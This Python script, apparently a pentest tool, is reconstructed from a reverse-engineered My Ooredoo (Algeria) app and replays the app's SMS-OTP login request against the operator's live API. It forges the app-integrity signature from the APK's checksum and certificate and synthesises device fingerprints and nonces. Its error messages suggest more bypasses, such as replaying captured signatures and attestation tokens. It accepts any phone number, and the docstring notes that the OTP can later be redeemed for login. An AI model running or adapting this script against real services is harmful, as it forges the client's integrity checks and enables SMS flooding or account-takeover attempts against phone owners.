#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
===============================================================================
 My Ooredoo (Algeria) v1.5.17 — OTP-SEND LOGIN-STEP SCRIPT  [v2 — fixed]
===============================================================================
 Target app   : My Ooredoo — com.algeria.selfcare.app.android v1.5.17 (1461)
 Source       : static reverse-engineering of 'My Ooredoo_1.5.17.apks'
                (jadx + Blutter Dart-AOT reversal + APK signing-block parse)
 Reconstructed: ApiCalls::requestOTPbyMSISDN @ 0xb905b8 (api_calls.dart)
                ApiCalls::getNonceValidation    @ 0x95c71c (api_calls.dart)
                ApiCalls::setChecksumHeaders    @ 0x92ab94  -> x-signature
                ApiCalls::setDeviceDataGatherForKeycloak @ 0x95c568 -> X-Platform-Info
                ApiCalls::setDeviceFingerprintHeader    @ 0x92a480 -> X-Device-Fingerprint
                SignatureHelper::generateXSignature     @ 0x1156ccc
                AppIntegrityCheckerPlugin (classes4.dex, jadx)
 Purpose      : replicate ONLY the "send me an SMS OTP" step of the app login.
                NO login / token redemption is performed by this script.
 Output       : full request/response logging (console + timestamped log file)
                for pentest documentation purposes.

 WHY v2 (what v1 was missing -> HTTP 401 "Invalid User Credentials"):
   1. MSISDN FORMAT — the app/Keycloak uses the international form. The
      companion report observed on the wire:  username=213xxxxxxx
      v1 sent the raw local form (05...). v2 normalizes to 213 + 9 digits.
   2. x-signature HEADER — computed at app startup as
      SHA256( checksum_decimal + signature_b64 )
        checksum   = String.valueOf(CRC32 of "classes.dex" inside the APK)
                     (ZipFile.getEntry("classes.dex").getCrc())
        signature  = Base64( SHA-256( APK signing certificate ) )
                     encoded with android.util.Base64 flag 0 (trailing \n)
      Both values are properties of the APK itself — extracted from the real
      base.apk in this repo, so we ship the genuine constant.
   3. DEVICE HEADERS — X-Platform-Info (JsonCodec.encode of
      {platform, is-physical-device, device-id}), X-Timestamp (epoch ms),
      X-Instance-Id (Settings.getUUID) and X-Device-Fingerprint
      (SignatureHelper.generateDeviceFingerprint =
       HMAC-SHA256(key = timestamp, msg = storedMSISDN + uuid + timestamp).hex)
      v2 synthesizes a stable pseudo-device (persisted in a state file).

 FLOW (verified against Dart AOT disassembly):
   1) POST {BASE}/api/ooredoo-bff/checkpoint/token        <- anti-replay nonce
        response headers carry: x-nonce-id, x-chronos-id
   2) POST {BASE}/api/auth/realms/myooredoo/protocol/openid-connect/token
        body: client_id=myooredoo-app & grant_type=password
              & username=<MSISDN in 213XXXXXXXXX form> [& resend=true]
        headers: x-msisdn, x-nonce-id, x-chronos-id, x-force-update,
                 x-version, platform, X-Platform-Origin, X-Correlation-ID,
                 x-signature, X-Platform-Info, X-Timestamp, X-Instance-Id,
                 X-Device-Fingerprint
      => the server side triggers the SMS OTP dispatch to the MSISDN.

 LEGAL: for use ONLY in controlled/authorized security-testing environments
 against numbers you own or are authorized to test. No liability for misuse.
===============================================================================
"""

import argparse
import hashlib
import hmac as hmac_mod
import json
import logging
import os
import secrets
import sys
import time
import uuid
from datetime import datetime

try:
    import requests
    import urllib3
except ImportError:  # pragma: no cover
    sys.stderr.write("[!] 'requests' is required:  pip install requests\n")
    sys.exit(1)

# ---------------------------------------------------------------------------
# Static configuration recovered from the APK (Dart string pool / asm / dex)
# ---------------------------------------------------------------------------
BASE_URL = "https://apis.ooredoo.dz"                      # EnvironmentSettings::getCurrentEnv @ 0x926110
EP_NONCE = "/api/ooredoo-bff/checkpoint/token"            # ApiCalls::getNonceValidation @ 0x95ca00
EP_TOKEN = "/api/auth/realms/myooredoo/protocol/openid-connect/token"  # requestOTPbyMSISDN @ 0xb90658
CLIENT_ID = "myooredoo-app"                               # @ 0xb9084c
APP_VERSION = "1.5.17"                                    # x-version header
USER_AGENT = "Dart/3.11 (dart:io)"                        # Dart http default UA
COUNTRY_CODE = "213"                                       # observed wire format: username=213xxxxxxx

# --- x-signature: computed from the GENUINE My Ooredoo 1.5.17 base.apk ------
# checksum   = String.valueOf(CRC32("classes.dex"))   = 3138619328
# signature = android.util.Base64(SHA-256(signing cert), flag 0)
#           = "KLYDvjaYq0SFAMqFTaEzMX0kQVR402qzUftEhMp6jyU=\n"
APK_CHECKSUM = "3138619328"
APK_SIGNATURE = "KLYDvjaYq0SFAMqFTaEzMX0kQVR402qzUftEhMp6jyU="
X_SIGNATURE = hashlib.sha256(
    (APK_CHECKSUM + APK_SIGNATURE + "\n").encode()
).hexdigest()  # Android Base64 flag-0 appends a trailing newline before hashing
# raw (no-newline) variant, kept for experimentation:
X_SIGNATURE_RAW = hashlib.sha256(
    (APK_CHECKSUM + APK_SIGNATURE).encode()
).hexdigest()

APP_HEADERS = {
    "platform": "android",
    "X-Platform-Origin": "mobile-android",
    "x-version": APP_VERSION,
    "x-force-update": "true",
}

LOG = logging.getLogger("ooredoo-otp")


# ---------------------------------------------------------------------------
# MSISDN normalization — local 05XXXXXXXX -> Keycloak 213XXXXXXXXX
# ---------------------------------------------------------------------------
def normalize_msisdn(raw: str) -> str:
    """
    The token endpoint expects the international MSISDN form (report §3:
    'username=213xxxxxxx'). Accepts:
      0549908213 / 549908213 / +213549908213 / 00213549908213 / 213549908213
    and returns '213549908213'.
    """
    digits = "".join(c for c in raw if c.isdigit())
    if not digits:
        raise ValueError("no digits in MSISDN")
    if digits.startswith("00213"):                       # int'l dial prefix
        digits = digits[2:]
    if digits.startswith(COUNTRY_CODE) and len(digits) >= 12:
        return digits
    if digits.startswith("0"):                           # national trunk '0'
        digits = digits[1:]
    if len(digits) == 9:                                  # national significant number
        digits = COUNTRY_CODE + digits
    elif not digits.startswith(COUNTRY_CODE):
        # fall back: prepend country code anyway (operator DZ)
        digits = COUNTRY_CODE + digits.lstrip("0")
    return digits


# ---------------------------------------------------------------------------
# Persistent pseudo-device (stable X-Instance-Id / device-id across runs)
# ---------------------------------------------------------------------------
def load_or_create_device(state_file: str) -> dict:
    """Settings.getUUID() + device_info_plus androidId analogue."""
    if os.path.exists(state_file):
        try:
            with open(state_file, "r", encoding="utf-8") as fh:
                return json.load(fh)
        except Exception:
            pass
    dev = {
        "uuid": str(uuid.uuid4()),                       # Settings::getUUID  @ 0x92aa58
        "device_id": secrets.token_hex(8),               # androidId — 16 hex chars
    }
    try:
        with open(state_file, "w", encoding="utf-8") as fh:
            json.dump(dev, fh, indent=2)
    except Exception:
        pass
    return dev


def platform_info_header(device: dict) -> str:
    """ApiCalls::setDeviceDataGatherForKeycloak @ 0x95c568 -> X-Platform-Info
    (JsonCodec.encode of {platform, is-physical-device, device-id})."""
    return json.dumps(
        {"platform": "android", "is-physical-device": True, "device-id": device["device_id"]},
        separators=(",", ":"), sort_keys=False,
    )


def device_fingerprint_header(device: dict, stored_msisdn: str, timestamp_ms: str) -> str:
    """SignatureHelper::generateDeviceFingerprint @ 0x92a630:
       HMAC-SHA256(key = utf8(ts), msg = utf8(msisdn + uuid + ts)).hexdigest()
    setDeviceFingerprintHeader passes stored Settings msisdn — which is EMPTY
    before the first successful login, so '' by default here."""
    msg = (stored_msisdn + device["uuid"] + timestamp_ms).encode()
    key = timestamp_ms.encode()
    return hmac_mod.new(key, msg, hashlib.sha256).hexdigest()


# ---------------------------------------------------------------------------
# Logging helpers — pentest-grade, full-wire documentation
# ---------------------------------------------------------------------------
def setup_logging(logfile: str | None, verbose: bool) -> logging.Logger:
    LOG.setLevel(logging.DEBUG)
    LOG.handlers.clear()
    fmt = logging.Formatter("%(asctime)s | %(levelname)-8s | %(message)s", "%H:%M:%S")
    con = logging.StreamHandler(sys.stdout)
    con.setLevel(logging.DEBUG if verbose else logging.INFO)
    con.setFormatter(fmt)
    LOG.addHandler(con)
    fh = logging.FileHandler(logfile, mode="w", encoding="utf-8")
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(logging.Formatter("%(asctime)s | %(levelname)-8s | %(message)s"))
    LOG.addHandler(fh)
    LOG.info("Log file: %s", os.path.abspath(logfile))
    return LOG


def banner() -> None:
    LOG.info("=" * 76)
    LOG.info("My Ooredoo 1.5.17 — OTP-SEND login-step replication (no login performed)")
    LOG.info("Reconstructed from: ApiCalls::requestOTPbyMSISDN @ 0xb905b8  [v2]")
    LOG.info("=" * 76)


def log_request(prep: requests.PreparedRequest) -> None:
    LOG.info("-" * 76)
    LOG.info(">> REQUEST  %s %s", prep.method, prep.url)
    for k, v in (prep.headers or {}).items():
        LOG.info(">> H  %s: %s", k, v)
    body = prep.body or ""
    if isinstance(body, bytes):
        try:
            body = body.decode("utf-8", "replace")
        except Exception:
            body = repr(body)
    if body:
        LOG.info(">> BODY  %s", body)


def log_response(resp: requests.Response) -> None:
    """FULL response display: status line, every header, and parsed body."""
    LOG.info("-- RESPONSE  HTTP %s %s  (%d bytes, %.0f ms)",
             resp.status_code, resp.reason, len(resp.content or b""),
             resp.elapsed.total_seconds() * 1000)
    for k, v in resp.headers.items():
        LOG.info("-- H  %s: %s", k, v)
    text = resp.text if resp.text else "(empty body)"
    try:
        LOG.info("-- BODY (pretty JSON):\n%s", json.dumps(json.loads(text), indent=2, ensure_ascii=False))
    except (ValueError, TypeError):
        LOG.info("-- BODY (raw):\n%s", text)
    LOG.info("-" * 76)


def do_request(session: requests.Session, prep: requests.PreparedRequest,
               timeout: float) -> requests.Response:
    log_request(prep)
    try:
        resp = session.send(prep, timeout=timeout)
    except requests.exceptions.SSLError as exc:
        LOG.error("[!] TLS error: %s", exc)
        raise SystemExit(2)
    except requests.exceptions.ConnectTimeout:
        LOG.error("[!] Connection timeout after %.1fs", timeout)
        raise SystemExit(2)
    except requests.exceptions.ConnectionError as exc:
        LOG.error("[!] Connection error: %s", exc)
        raise SystemExit(2)
    log_response(resp)
    return resp


def parse_extra_headers(items: list[str] | None) -> dict[str, str]:
    out: dict[str, str] = {}
    for it in items or []:
        if ":" not in it:
            LOG.warning("[!] ignoring malformed --extra-header: %r", it)
            continue
        k, v = it.split(":", 1)
        out[k.strip()] = v.strip()
    return out


# ---------------------------------------------------------------------------
# Device header bundle (x-signature + platform info + fingerprint)
# ---------------------------------------------------------------------------
def device_headers(device: dict, stored_msisdn: str) -> dict[str, str]:
    ts = str(int(time.time() * 1000))                    # DateTime._getCurrentMicros -> ms
    return {
        "x-signature": X_SIGNATURE,
        "X-Platform-Info": platform_info_header(device),
        "X-Timestamp": ts,
        "X-Instance-Id": device["uuid"],
        "X-Device-Fingerprint": device_fingerprint_header(device, stored_msisdn, ts),
    }


# ---------------------------------------------------------------------------
# Step 1 — checkpoint nonce (ApiCalls::getNonceValidation)
# ---------------------------------------------------------------------------
def get_nonce(session: requests.Session, base: str, msisdn: str,
              extra: dict[str, str], device: dict, timeout: float) -> tuple[str, str]:
    """
    POST {base}/api/ooredoo-bff/checkpoint/token
      x-path   = the protected call path, x-method = POST
      harvests x-nonce-id / x-chronos-id from the RESPONSE HEADERS.
    """
    url = base + EP_NONCE
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": USER_AGENT,
        "x-msisdn": msisdn,
        "x-path": EP_TOKEN,
        "x-method": "POST",
        "X-Correlation-ID": str(uuid.uuid1()),          # Uuid::v1 @ 0x92afa0
        **APP_HEADERS,
        **device_headers(device, stored_msisdn=""),
        **extra,
    }
    prep = session.prepare_request(requests.Request("POST", url, headers=headers, data={}))

    LOG.info("[STEP 1] checkpoint nonce — anti-replay pre-flight")
    resp = do_request(session, prep, timeout)

    nonce_id = resp.headers.get("x-nonce-id", "")
    chronos_id = resp.headers.get("x-chronos-id", "")
    if resp.ok and nonce_id:
        LOG.info("[+] nonce acquired  x-nonce-id=%s  x-chronos-id=%s",
                 nonce_id, chronos_id or "(absent)")
    else:
        LOG.warning("[!] checkpoint gave HTTP %s / nonce=%r — continuing "
                    "(app tolerates empty nonce @ 0xb908f8).", resp.status_code, nonce_id)
    return nonce_id, chronos_id


# ---------------------------------------------------------------------------
# Step 2 — the OTP send (ApiCalls::requestOTPbyMSISDN)
# ---------------------------------------------------------------------------
def request_otp(session: requests.Session, base: str, msisdn: str,
                nonce_id: str, chronos_id: str, resend: bool,
                extra: dict[str, str], device: dict, timeout: float) -> requests.Response:
    """
    POST {base}/api/auth/realms/myooredoo/protocol/openid-connect/token
    Body (@ 0xb90840-0xb908b8): client_id, grant_type=password, username,
    resend=true (resend variant only). The received SMS OTP is later used AS
    the password of a ROPC grant (loginWithOTP) — NOT done by this script.
    """
    url = base + EP_TOKEN
    form = {
        "client_id": CLIENT_ID,
        "grant_type": "password",
        "username": msisdn,                              # 213XXXXXXXXX form
    }
    if resend:
        form["resend"] = "true"                           # @ 0xb908a0

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "User-Agent": USER_AGENT,
        "x-msisdn": msisdn,
        "x-nonce-id": nonce_id,
        "x-chronos-id": chronos_id,
        "X-Correlation-ID": str(uuid.uuid1()),
        **APP_HEADERS,
        **device_headers(device, stored_msisdn=""),
        **extra,
    }
    prep = session.prepare_request(requests.Request("POST", url, headers=headers, data=form))

    LOG.info("[STEP 2] OTP request — grant-construction of requestOTPbyMSISDN")
    return do_request(session, prep, timeout)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main() -> None:
    p = argparse.ArgumentParser(
        description="My Ooredoo 1.5.17 — replicate the OTP-SEND login step "
                    "(phone number -> SMS OTP dispatch). No login is completed.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("msisdn", nargs="?", help="MSISDN to request the OTP for. Local "
                   "(0549908213), international (213549908213) or +213 forms accepted; "
                   "it is normalized to the Keycloak form automatically. Prompted if omitted.")
    p.add_argument("--resend", action="store_true",
                   help="mark the request as a re-send (adds resend=true to the grant body)")
    p.add_argument("--base-url", default=BASE_URL, help="API base URL (lab/mock override)")
    p.add_argument("--proxy", help="HTTP(S) proxy, e.g. http://127.0.0.1:8080 (Burp)")
    p.add_argument("--extra-header", action="append", metavar="K:V",
                   help="additional header, repeatable — overrides synthesized ones "
                        "(x-signature, X-JWS, X-Native-Integrity-Token, ...)")
    p.add_argument("--no-nonce", action="store_true", help="skip checkpoint pre-flight")
    p.add_argument("--timeout", type=float, default=15.0, help="per-request timeout (s)")
    p.add_argument("--insecure", action="store_true", help="do not verify TLS (Burp)")
    p.add_argument("--state-file", default=".ooredoo_device_state.json",
                   help="pseudo-device state (uuid + android-id) persistence")
    p.add_argument("--x-sig-raw", action="store_true",
                   help="use the no-newline x-signature variant instead of the "
                        "Android-Base64(flag 0) one")
    p.add_argument("--fingerprint-msisdn", default="",
                   help="stored Settings-MSISDN used inside X-Device-Fingerprint "
                        "(app uses '' before first login)")
    p.add_argument("--logfile", help="custom log file path")
    p.add_argument("-v", "--verbose", action="store_true", help="debug output on console")
    args = p.parse_args()

    global X_SIGNATURE
    if args.x_sig_raw:
        X_SIGNATURE = X_SIGNATURE_RAW

    msisdn = (args.msisdn or "").strip()
    if not msisdn:
        try:
            msisdn = input("[?] Enter phone number (MSISDN): ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return
    if not msisdn:
        LOG.error("[!] no MSISDN provided — aborting.")
        return
    try:
        norm = normalize_msisdn(msisdn)
    except ValueError as exc:
        LOG.error("[!] %s — aborting.", exc)
        return

    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    setup_logging(args.logfile or f"ooredoo_otp_{norm}_{stamp}.log", args.verbose)
    banner()
    LOG.info("Input MSISDN : %s  ->  normalized: %s", msisdn, norm)
    LOG.info("Base URL     : %s", args.base_url)
    LOG.info("x-signature  : %s%s", X_SIGNATURE[:16] + "…", " (raw variant)" if args.x_sig_raw else "")
    if args.proxy:
        LOG.info("Proxy        : %s", args.proxy)
    if args.insecure:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        LOG.warning("TLS verification DISABLED (interception mode)")

    device = load_or_create_device(args.state_file)
    LOG.info("Pseudo-device: instance-id=%s  device-id=%s  (state: %s)",
             device["uuid"], device["device_id"], os.path.abspath(args.state_file))

    extra = parse_extra_headers(args.extra_header)
    if extra:
        LOG.info("Extra headers: %s", extra)

    session = requests.Session()
    session.proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    session.verify = not args.insecure

    # --- step 1: anti-replay nonce ----------------------------------------
    if args.no_nonce:
        LOG.info("[STEP 1] skipped by --no-nonce (empty nonce ids)")
        nonce_id, chronos_id = "", ""
    else:
        try:
            nonce_id, chronos_id = get_nonce(session, args.base_url, norm,
                                             extra, device, args.timeout)
        except SystemExit:
            raise
        except Exception as exc:
            LOG.warning("[!] checkpoint pre-flight failed (%s) — continuing with empty nonce", exc)
            nonce_id, chronos_id = "", ""

    # --- step 2: the OTP dispatch ------------------------------------------
    resp = request_otp(session, args.base_url, norm, nonce_id, chronos_id,
                       args.resend, extra, device, args.timeout)

    # --- verdict ------------------------------------------------------------
    LOG.info("=" * 76)
    if 200 <= resp.status_code < 300:
        LOG.info("[+] OTP-REQUEST COMPLETED — HTTP %s. If the MSISDN is valid and "
                 "authorized, an SMS OTP has been dispatched by the operator.",
                 resp.status_code)
        LOG.info("[i] The app would next use that OTP as the 'password'/'otp' param of a "
                 "ROPC grant (loginWithOTP) — intentionally NOT done here.")
    elif resp.status_code == 429:
        LOG.info("[*] HTTP 429 — rate-limited / too many OTP requests for this MSISDN.")
    elif resp.status_code in (400, 401, 403):
        LOG.info("[*] HTTP %s — rejected. Remaining candidates, in likelihood order:",
                 resp.status_code)
        LOG.info("      1) try --x-sig-raw (Android Base64 newline ambiguity)")
        LOG.info("      2) capture the real app through the proxy (no pinning, user CA "
                 "trusted — report F-01/F-02) and replay its x-signature via "
                 "--extra-header 'x-signature: <captured>'")
        LOG.info("      3) supply captured X-JWS / X-Native-Integrity-Token if attested")
    elif resp.status_code >= 500:
        LOG.info("[*] HTTP %s — server-side error.", resp.status_code)
    LOG.info("[i] Full wire transcript saved to the log file above.")
    LOG.info("=" * 76)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] interrupted")
        sys.exit(130)
